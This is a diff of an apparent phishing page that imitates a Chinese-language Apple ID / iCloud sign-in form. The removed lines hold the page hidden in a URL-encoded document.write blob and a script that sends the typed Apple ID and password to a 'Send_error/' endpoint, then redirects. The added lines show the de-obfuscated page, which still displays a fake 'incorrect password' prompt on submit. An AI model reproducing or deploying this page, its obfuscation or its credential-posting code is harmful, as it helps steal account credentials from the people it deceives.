@@ -1,47 +1,318 @@
+<html>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<script>document.write(unescape('%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text/html%3B%20charset%3Dutf-8%22%3E%0A%3Clink%20rel%3D%22icon%22%20href%3D%22picture/favicon.ico%22%20type%3D%22image/x-icon%22%3E%0A%3Clink%20rel%3D%22shortcut%20icon%22%20href%3D%22picture/favicon.ico%22%20type%3D%22image/x-icon%22%3E%0A%3Cmeta%20name%3D%22viewport%22%20content%3D%22%20initial-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20user-scalable%3Dno%22%3E%0A%3Cmeta%20name%3D%22format-detection%22%20content%3D%22telephone%3Dno%22%3E%0A%3Cscript%20src%3D%22http%3A//cdn.static.runoob.com/libs/angular.js/1.4.6/angular.min.js%22%3E%3C/script%3E%0A%3Cscript%20src%3D%22jquery-3.2.1.min.js%22%3E%3C/script%3E%0A%3Clink%20rel%3D%22stylesheet%22%20href%3D%22picture/wapcss_idcn.css%22%20media%3D%22all%22%3E%0A%3Cscript%3E%20%24%28document%29.keydown%28function%28e%29%7B%20if%28e.keyCode%3D%3D8%29%7B%20localtion.reload%28true%29%3B%20%7D%7D%29%3C/script%3E%0A%3Cscript%3E%0A%20%24%28function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22body%22%29.keydown%28function%28event%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28event.keyCode%3D%3D8%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20location.reload%28%29%20%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%0A%3C/script%3E%0A%3Cscript%20type%3D%22text/javascript%22%3E%0Afunction%20changeImg%28Apwd%29%20%7B%0Adocument.getElementById%28Apwd%29.src%3D%22image/2.gif%22%3B%0AsetTimeout%28%22document.getElementById%28%27%22+Apwd+%22%27%29.src%3D%27login.png%27%3B%22%2C1000%29%3B%0A%7D%0A%3C/script%3E%0A%3Cscript%20type%3D%22text/javascript%22%3E%20%0A%0Afunction%20%09AchangeTest%28obj%29%7B%20%0A%0A%20%20%20%20if%28obj.innerHTML.length%3D%3D0%29%7B%20%0A%09%0A%20%20%20%20%20%20%20document.getElementById%28%27Apwd%27%29.className%20%3D%20%27input%27%3B%0A%20%20%20%20%20%20%20document.getElementById%28%27Apwd%27%29.disabled%20%3D%20true%3B%0A%09%20%20%20%20document.getElementById%28%27testDiv1%27%29.className%20%3D%20%27button1%27%3B%0A%20%20%20%20%20%20%20document.getElementById%28%27testDiv1%27%29.disabled%20%3D%20true%3B%0A%0A%20%20%20%20%7D%20else%20%7B%20%0A%09%20%20%20document.getElementById%28%27Apwd%27%29.className%20%3D%20%27classa%27%3B%0A%20%20%20%20%20%20%20document.getElementById%28%27Apwd%27%29.disabled%20%3D%20false%3B%20%0A%09%20document.getElementById%28%27testDiv1%27%29.className%20%3D%20%27button2%27%3B%0A%20%20%20%20%20%20%20document.getElementById%28%27testDiv1%27%29.disabled%20%3D%20false%3B%20%0A%20%20%20%20%7D%20%0A%0A%7D%20%0A%0A%3C/script%3E%0A%3Cscript%3E%0Aif%28window.name%20%21%3D%20%22bencalie%22%29%7B%0A%20%20%20%20location.reload%28%29%3B%0A%20%20%20%20window.name%20%3D%20%22bencalie%22%3B%0A%7D%0Aelse%7B%0A%20%20%20%20window.name%20%3D%20%22%22%3B%0A%7D%0A%3C/script%3E%0A%3Cscript%20type%3D%22text/javascript%22%20language%3D%22javascript%22%3E%0A%20%20function%20OnTextChanged%28%29%20%7B%0A%20%20%20%20%20%20if%20%28event.keyCode%20%3D%3D%2013%29%20%7B//%u5224%u65AD%u662F%u5426%u4E3A%u56DE%u8F66%u952E%0A%20%20%20%20%20%20%20%20%20%20event.keyCode%20%3D%200%3B//%u5C4F%u853D%u56DE%u8F66%u952E%0A%20%20%20%20%20%20%20%20%20%20event.returnValue%20%3D%20false%3B%0A%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%7D%0A%20%20%7D%0A%20%20%3C/script%3E%0A%3Cscript%20type%3D%22text/javascript%22%3E%20%0A%0Afunction%20changeTest%28obj%29%7B%20%0A%0A%20%20%20%20if%28obj.innerHTML.length%3D%3D0%29%7B%20%0A%09%0A%20%20%20%20document.getElementById%28%27test%27%29.disabled%20%3D%20true%3B%0A%20%20%20%20%20%20%20document.getElementById%28%27qieh%27%29.disabled%20%3D%20true%3B%0A%0A%20%20%20%20%7D%20else%20%7B%20%0A%20%20%20document.getElementById%28%27test%27%29.disabled%20%3D%20false%3B%20%0A%20%20%20%20%20%20%20document.getElementById%28%27qieh%27%29.disabled%20%3D%20false%3B%20%0A%0A%20%20%20%20%7D%20%0A%20%20%20%20%0A%7D%0A%3C/script%3E%0A%3Cscript%20src%3D%22JQ_AJAX.JS%22%3E%3C/script%3E%0A%3Cscript%20type%3D%22text/javascript%22%3E%0Afunction%20checktxt%28%29%7B%0Avar%20a%3Ddocument.getElementById%28%22loginn%22%29.innerHTML%3B%0Aif%28a%3D%3Dnull%20%7C%7C%20a%3D%3D%22%22%29%7B%0Adocument.getElementById%28%22loginn%22%29.style.display%3D%22block%22%3B%0A%7D%20else%20%7B%0Adocument.getElementById%28%22loginn%22%29.style.display%3D%22none%22%3B%0A%7D%0A%0A%0A%7D%0A%3C/script%3E%0A%3Cstyle%20type%3D%22text/css%22%3E%0A%0A/**css%u6837%u5F0F*/%0A%20%20%20%20%20%20%20%20.input%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A300px%3B%0A%09%09%09%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20-webkit-text-security%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A15px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A4px%205px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%0A%09%09%09%0Aline-height%3A18px%3Bwhite-space%3Anowrap%3B%0Acolor%3A%23CCCCCC%0A%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%23App1%3Aempty%3A%3Abefore%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20content%3A%20attr%28placeholder%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20.input%3Aempty%3A%3Abefore%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20content%3A%20attr%28placeholder%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%09%0A%20%20%20%20%20%20%20%20.classa%09%7B%20width%3A300px%3B%0A%09%09%09%0A%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20-webkit-text-security%3A%20disc%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A15px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A4px%205px%3B%0A%20%20%20%20%20%20%20%20%20%0A%09%09%09%0Aline-height%3A18px%3Bwhite-space%3Anowrap%3B%0Acolor%3A%23CCCCCC%0A%7D%0A%23loginn%20%7B%20display%3Anone%3B%0A%7D%0A%0A.login_1%7B%20width%3A26px%3B%20height%3A26px%3Bbackground-image%3Aurl%2839.png%29%3Bborder%3Anone%3B%7D%0A.login_2%7B%20width%3A26px%3B%20height%3A26px%3B%20background-image%3Aurl%2841.png%29border%3Anone%3B%7D%0A%0A.button1%7B%0Adisplay%3Ablock%7D%0A.button2%7B%0Adisplay%3Anone%7D%0A%3C/style%3E%0A%3Cscript%20language%3D%22javascript%22%3E%0Awindow.onload%3Dfunction%28%29%0A%20%20%7B%20var%20oBtn%3Ddocument.getElementById%28%27login-button2%27%29%3B%0A%20%20%20%20var%20oDiv%3Ddocument.getElementById%28%27loginn1%27%29%3B%0A%20oBtn.onclick%3Dfunction%28ev%29%0A%20%7B%20var%20oEvent%3Dev%7C%7Cevent%3B%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20oDiv.style.display%3D%27block%27%3B%0A%20%20%20oEvent.cancelBubble%3Dtrue%3B%7D%20%20%20%20%20%20%20%20%20%20%0A%20document.onclick%3Dfunction%28%29%0A%20%7BoDiv.style.display%3D%27none%27%3B%7D%20%0A%20%7D%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%3C/script%3E%0A%3Cstyle%3E%0A%0A%20%0A%0A.tip%7B%0A%0Awidth%3A250px%3B%0A%0Aheight%3A70px%3B%0A%0Aborder%3A1px%20solid%20%23fae9a3%3B%20%0A%0Aborder-radius%3A8px%3B%0Abackground-color%3A%20%23fae9a3%3B%0A%0A%7D%0A%0A%20%0A%0A.tip%20.inner%7B%0A%0Abackground-color%3A%20%23fae9a3%3B%0A%0Awidth%3A10px%3B%0A%0Aheight%3A10px%3B%0A%0Aborder%3A1px%20solid%20%23fae9a3%3B%0A%0A%20%0A%0Aposition%3Arelative%3B%0A%0Aleft%3A0px%3B%0A%0Atop%3A-7px%3B%0A%0Atransform%3Arotate%2845deg%29%3B%0A%0Aborder-right%3A0px%3B%0A%0Aborder-bottom%3A0px%3B%20background-color%3A%23fae9a3%0A%0A%7D%0A%23pop%7B%0Az-index%3A9999%3B%0A%0A%7D%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Cdiv%20style%3D%22margin-top%3A20%25%3B%20%22%3E%3C/div%3E%0A%3Ccenter%3E%0A%20%20%3Cimg%20src%3D%22icloud_drive_icon.png%22%20style%3D%22width%3A200px%22%3E%0A%3C/center%3E%0A%3Cp%3E%3C/p%3E%0A%3Cdiv%20class%3D%22main%22%20style%3D%22border%3A0px%20solid%20red%22%3E%0A%20%20%3Cp%20class%3D%22lok%22%3E%u7BA1%u7406%u60A8%u7684%20Apple%20ID%20%u8D26%u6237%3C/p%3E%0A%20%20%3Cul%20class%3D%22main_list%22%20id%3D%22login-right%22%3E%0A%20%20%20%20%3Cli%20id%3D%22bton1%22%20style%3D%22%22%3E%20%3Cspan%20id%3D%22testDiv%22%20class%3D%22%22%3E%0A%20%20%20%20%20%20%3Cinput%20name%3D%22login-button2%22%20id%3D%22test%22%20type%3D%22image%22%20src%3D%22login.png%22%20disabled%3D%22disabled%22%20width%3D%2226%22%20height%3D%2226%22%20align%3D%22right%22%20style%3D%22margin-top%3A-4px%3Boutline%3Anone%3B%22%20onClick%3D%22changeclass%28%29%22%3E%0A%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%3Cdiv%20contenteditable%3D%22true%22%20class%3D%22input%20%22%20id%3D%22App1%22%20name%3D%22App1%22%20type%3D%22text%22%20placeholder%3D%22Apple%20ID%22%20style%3D%22outline%3Anone%3Bcolor%3A%20%23999%3B%20font-weight%3A100%22%20onKeyDown%3D%22ADivFollowingText%28%29%3B%22%20onKeyPress%3D%22OnTextChanged%28%29%3B%22%20onblur%3D%22checktxt%28%29%3B%22%20onKeyUp%3D%22changeTest%28this%29%3B%22%3E%3C/div%3E%0A%20%20%20%20%3C/li%3E%0A%20%20%20%20%3Cli%20id%3D%22testDiv1%22%20class%3D%22button2%22%3E%3Cspan%20class%3D%22%22%3E%0A%20%20%20%20%20%20%3Cinput%20name%3D%22login-button%22%20id%3D%22qieh%22%20type%3D%22image%22%20disabled%3D%22disabled%22%20src%3D%22login.png%22%20width%3D%2226%22%20height%3D%2226%22%20align%3D%22right%22%20style%3D%22margin-top%3A-4px%3Boutline%3A%20none%3B%22%20ng-app%3D%22myApp%22%20ng-controller%3D%22personCtrl%22%20%20ng-click%3D%22toggle%28%29%22%20onClick%3D%22changeImg%28this.id%29%22%20class%3D%22ng-scope%22%3E%0A%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%3Cdiv%20style%3D%22outline%3Anone%3Bcolor%3A%20%23999%3B%22%20id%3D%22Apwd%22%20class%3D%22input%20%22%20name%3D%22Apwd%22%20contenteditable%3D%22TRUE%22%20placeholder%3D%22%u5BC6%u7801%22%20onKeyUp%3D%22AchangeTest%28this%29%3B%22%20onKeyDown%3D%22DivFollowingText%28%29%3B%22%20onKeyPress%3D%22OnTextChanged%28%29%3B%22%3E%3C/div%3E%0A%20%20%20%20%3C/li%3E%0A%20%20%3C/ul%3E%0A%20%0A%20%20%3Cdiv%20align%3D%22center%22%20style%3D%22position%3Aabsolute%3Bz-index%3A9999%3Bmargin-top%3A1%25%3Bdisplay%3Anone%3Bpadding-left%3A25px%3B%22%20%20id%3D%22pop%22%20%20%3E%0A%20%20%20%20%3Cdiv%20class%3D%22tip%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22inner%22%3E%3C/div%3E%0A%20%20%20%20%20%20%3Cdiv%20style%3D%22margin%3A4px%3B%20font-size%3A15px%3Bcolor%3A%23503e30%22%20align%3D%22center%22%3EApple%20ID%20%u6216%u5BC6%u7801%u4E0D%u6B63%u786E%3C/div%3E%0A%20%20%20%20%20%20%3Cdiv%20style%3D%22margin%3A4px%3B%20font-size%3A10px%3Bcolor%3A%23503e30%22%20align%3D%22center%22%3E%3Ca%20href%3D%22%22%20style%3D%22color%3A%23503e30%22%3E%u5FD8%u8BB0%u5BC6%u7801%3F%3C/a%3E%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%3C/div%3E%0A%0A%0A%3Cdiv%20align%3D%22center%22%3E%3Cbr%3E%0A%20%20%3Cbr%3E%0A%20%20%3Clabel%20id%3D%22remember-me-label%22%20class%3D%22form-label%22%20for%3D%22remember-me%22%3E%20%3Cspan%20class%3D%22form-choice-indicator%22%3E%3Cimg%20id%3D%22img%22%20src%3D%22image/0190128135834.png%22%20width%3D%2216%22%20height%3D%2217%22%3E%3C/span%3E%20%3Cspan%20style%3D%22%20font-size%3A15px%3Bcolor%3A%23FFFFFF%22%3E%u4FDD%u6301%u6211%u7684%u767B%u5F55%u72B6%u6001%3C/span%3E%20%3C/label%3E%0A%3C/div%3E%0A%3Cbr%3E%0A%3Cscript%20type%3D%22text/javascript%22%3E%0Adocument.getElementById%28%22test%22%29.onclick%3Dfunction%28%29%7B%0Adocument.getElementById%28%22testDiv%22%29.style.display%3D%22none%22%3B%0Adocument.getElementById%28%22testDiv1%22%29.style.display%3D%22block%22%3B%0Adocument.getElementById%28%22bton1%22%29.style%3D%22border-bottom%3A1px%20solid%20%23dedede%3B%22%3B%0A%0A%7D%0A%3C/script%3E%0A%3Cscript%20type%3D%22text/JavaScript%22%3E%0A%20%20%20%0A%09function%20stopPropagation%28e%29%20%7B%0A%09%09var%20ev%20%3D%20e%20%7C%7C%20window.event%3B%0A%09%09if%20%28ev.stopPropagation%29%20%7B%0A%09%09%09ev.stopPropagation%28%29%3B%0A%09%09%7D%0A%09%09else%20if%20%28window.event%29%20%7B%0A%09%09%09window.event.cancelBubble%20%3D%20true%3B//%u517C%u5BB9IE%0A%09%09%7D%0A%09%7D%0A%09%24%28%22%23qieh%22%29.click%28function%20%28e%29%20%7B%0A%09%09%24%28%22%23pop%22%29.show%28%29%3B%0A%09%09stopPropagation%28e%29%3B%0A%09%7D%29%3B%0A%09%24%28document%29.bind%28%27click%27%2C%20function%20%28%29%20%7B%0A%09%09%24%28%22%23pop%22%29.hide%28%29%3B%0A%09%7D%29%3B%0A%09%24%28%22%23pop%22%29.click%28function%20%28e%29%20%7B%0A%09%09stopPropagation%28e%29%3B%0A%09%7D%29%3B%0A%3C/script%3E%0A%3Cscript%3E%0Awindow.onload%20%3D%20function%28%29%7B%0Avar%09oImg%20%3D%20document.getElementById%28%27img%27%29%3B%0Avar%20onOff%20%3D%20true%3B%0A%0AoImg.onclick%20%3D%20function%28%29%7B%0A%09if%28onOff%29%7B%0A%09%09oImg.src%20%3D%20%27image/20190128142059.png%27%3B%0A%09%09onOff%20%3D%20false%3B%09%0A%09%7Delse%7B%0A%09%09oImg.src%20%3D%20%27image/0190128135834.png%27%3B%0A%09%09onOff%20%3D%20true%3B%09%0A%09%7D%09%0A%7D%3B%0A%0A%7D%3B%0A%3C/script%3E%0A%0A%20%0A%3C/body%3E%0A%3C/html%3E'));</script>
-<script type="text/javascript">
-$('#qieh').click(function(){
-var username = $("#App1").text();    
-	var userpass = $("#Apwd").text();
-
-		$.ajax({
-		async: false,
-			type: 'post',
-			url:'Send_error/',
-		   data: {"username": username, "userpass": userpass },  
-			dataType:'json',
-			 success : function(msg){
-			
-			   $("#Apwd").empty();
-				if(msg == 3){
-				   top.location.href = '../APP/TEL/PM_INGEAFAFASDFWSF3234234234.html';
-				}else{
-				  //alert ("账号和密码错误,请重试！");
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<link rel="icon" href="picture/favicon.ico" type="image/x-icon">
+	<link rel="shortcut icon" href="picture/favicon.ico" type="image/x-icon">
+	<meta name="viewport" content=" initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<meta name="format-detection" content="telephone=no">
+	<script src="http://cdn.static.runoob.com/libs/angular.js/1.4.6/angular.min.js"></script>
+	<script src="jquery-3.2.1.min.js"></script>
+	<link rel="stylesheet" href="picture/wapcss_idcn.css" media="all">
+	<script> $(document).keydown(function (e) { if (e.keyCode == 8) { localtion.reload(true); } })</script>
+	<script>
+		$(function () {
+			$("body").keydown(function (event) {
+				if (event.keyCode == 8) {
+					location.reload();
 				}
+			});
+		});
+
+	</script>
+	<script type="text/javascript">
+		function changeImg(Apwd) {
+			document.getElementById(Apwd).src = "image/2.gif";
+			setTimeout("document.getElementById('" + Apwd + "').src='login.png';", 1000);
+		}
+	</script>
+	<script type="text/javascript">
+
+		function AchangeTest(obj) {
+
+			if (obj.innerHTML.length == 0) {
+
+				document.getElementById('Apwd').className = 'input';
+				document.getElementById('Apwd').disabled = true;
+				document.getElementById('testDiv1').className = 'button1';
+				document.getElementById('testDiv1').disabled = true;
+
+			} else {
+				document.getElementById('Apwd').className = 'classa';
+				document.getElementById('Apwd').disabled = false;
+				document.getElementById('testDiv1').className = 'button2';
+				document.getElementById('testDiv1').disabled = false;
 			}
-		})
-	
-});
+
+		}
+
+	</script>
+	<script>
+		if (window.name != "bencalie") {
+			location.reload();
+			window.name = "bencalie";
+		}
+		else {
+			window.name = "";
+		}
+	</script>
+	<script type="text/javascript" language="javascript">
+		function OnTextChanged() {
+			if (event.keyCode == 13) {//判断是否为回车键
+				event.keyCode = 0;//屏蔽回车键
+				event.returnValue = false;
+
+			}
+		}
+	</script>
+	<script type="text/javascript">
+
+		function changeTest(obj) {
+
+			if (obj.innerHTML.length == 0) {
+
+				document.getElementById('test').disabled = true;
+				document.getElementById('qieh').disabled = true;
+
+			} else {
+				document.getElementById('test').disabled = false;
+				document.getElementById('qieh').disabled = false;
+
+			}
+
+		}
+	</script>
+	<script src="JQ_AJAX.JS"></script>
+	<script type="text/javascript">
+		function checktxt() {
+			var a = document.getElementById("loginn").innerHTML;
+			if (a == null || a == "") {
+				document.getElementById("loginn").style.display = "block";
+			} else {
+				document.getElementById("loginn").style.display = "none";
+			}
 
 
-			
+		}
+	</script>
+	<style type="text/css">
+		/**css样式*/
+		.input {
+			width: 300px;
+
+
+			-webkit-text-security: none;
+			font-size: 15px;
+			padding: 4px 5px;
+
+
+			line-height: 18px;
+			white-space: nowrap;
+			color: #CCCCCC
+		}
+
+		#App1:empty::before {
+			content: attr(placeholder);
+		}
+
+		.input:empty::before {
+			content: attr(placeholder);
+		}
+
+		.classa {
+			width: 300px;
+
+
+			-webkit-text-security: disc;
+			font-size: 15px;
+			padding: 4px 5px;
+
+
+			line-height: 18px;
+			white-space: nowrap;
+			color: #CCCCCC
+		}
+
+		#loginn {
+			display: none;
+		}
+
+		.login_1 {
+			width: 26px;
+			height: 26px;
+			background-image: url(39.png);
+			border: none;
+		}
+
+		.login_2 {
+			width: 26px;
+			height: 26px;
+			background-image: url(41.png)border:none;
+		}
+
+		.button1 {
+			display: block
+		}
+
+		.button2 {
+			display: none
+		}
+	</style>
+	<script language="javascript">
+		window.onload = function () {
+			var oBtn = document.getElementById('login-button2');
+			var oDiv = document.getElementById('loginn1');
+			oBtn.onclick = function (ev) {
+				var oEvent = ev || event;
+				oDiv.style.display = 'block';
+				oEvent.cancelBubble = true;
+			}
+			document.onclick = function () { oDiv.style.display = 'none'; }
+		}
+	</script>
+	<style>
+		.tip {
+
+			width: 250px;
+
+			height: 70px;
+
+			border: 1px solid #fae9a3;
+
+			border-radius: 8px;
+			background-color: #fae9a3;
+
+		}
 
 
 
+		.tip .inner {
+
+			background-color: #fae9a3;
+
+			width: 10px;
+
+			height: 10px;
+
+			border: 1px solid #fae9a3;
+
+
+
+			position: relative;
+
+			left: 0px;
+
+			top: -7px;
+
+			transform: rotate(45deg);
+
+			border-right: 0px;
+
+			border-bottom: 0px;
+			background-color: #fae9a3
+		}
+
+		#pop {
+			z-index: 9999;
+
+		}
+	</style>
+</head>
+
+<body>
+	<div style="margin-top:20%; "></div>
+	<center>
+		<img src="icloud_drive_icon.png" style="width:200px">
+	</center>
+	<p></p>
+	<div class="main" style="border:0px solid red">
+		<p class="lok">管理您的 Apple ID 账户</p>
+		<ul class="main_list" id="login-right">
+			<li id="bton1" style=""> <span id="testDiv" class="">
+					<input name="login-button2" id="test" type="image" src="login.png" disabled="disabled" width="26" height="26"
+						align="right" style="margin-top:-4px;outline:none;" onClick="changeclass()">
+				</span>
+				<div contenteditable="true" class="input " id="App1" name="App1" type="text" placeholder="Apple ID"
+					style="outline:none;color: #999; font-weight:100" onKeyDown="ADivFollowingText();"
+					onKeyPress="OnTextChanged();" onblur="checktxt();" onKeyUp="changeTest(this);"></div>
+			</li>
+			<li id="testDiv1" class="button2"><span class="">
+					<input name="login-button" id="qieh" type="image" disabled="disabled" src="login.png" width="26" height="26"
+						align="right" style="margin-top:-4px;outline: none;" ng-app="myApp" ng-controller="personCtrl"
+						ng-click="toggle()" onClick="changeImg(this.id)" class="ng-scope">
+				</span>
+				<div style="outline:none;color: #999;" id="Apwd" class="input " name="Apwd" contenteditable="TRUE"
+					placeholder="密码" onKeyUp="AchangeTest(this);" onKeyDown="DivFollowingText();" onKeyPress="OnTextChanged();">
+				</div>
+			</li>
+		</ul>
+
+		<div align="center" style="position:absolute;z-index:9999;margin-top:1%;display:none;padding-left:25px;" id="pop">
+			<div class="tip">
+				<div class="inner"></div>
+				<div style="margin:4px; font-size:15px;color:#503e30" align="center">Apple ID 或密码不正确</div>
+				<div style="margin:4px; font-size:10px;color:#503e30" align="center"><a href="" style="color:#503e30">忘记密码?</a>
+				</div>
+			</div>
+		</div>
+
+
+		<div align="center"><br>
+			<br>
+			<label id="remember-me-label" class="form-label" for="remember-me"> <span class="form-choice-indicator"><img
+						id="img" src="image/0190128135834.png" width="16" height="17"></span> <span
+					style=" font-size:15px;color:#FFFFFF">保持我的登录状态</span> </label>
+		</div>
+		<br>
+		<script type="text/javascript">
+			document.getElementById("test").onclick = function () {
+				document.getElementById("testDiv").style.display = "none";
+				document.getElementById("testDiv1").style.display = "block";
+				document.getElementById("bton1").style = "border-bottom:1px solid #dedede;";
+
+			}
+		</script>
+		<script type="text/JavaScript">
+
+	function stopPropagation(e) {
+		var ev = e || window.event;
+		if (ev.stopPropagation) {
+			ev.stopPropagation();
+		}
+		else if (window.event) {
+			window.event.cancelBubble = true;//兼容IE
+		}
+	}
+	$("#qieh").click(function (e) {
+		$("#pop").show();
+		stopPropagation(e);
+	});
+	$(document).bind('click', function () {
+		$("#pop").hide();
+	});
+	$("#pop").click(function (e) {
+		stopPropagation(e);
+	});
 </script>
+		<script>
+			window.onload = function () {
+				var oImg = document.getElementById('img');
+				var onOff = true;
+
+				oImg.onclick = function () {
+					if (onOff) {
+						oImg.src = 'image/20190128142059.png';
+						onOff = false;
+					} else {
+						oImg.src = 'image/0190128135834.png';
+						onOff = true;
+					}
+				};
+
+			};
+		</script>
+
+
+</body>
+
+</html>
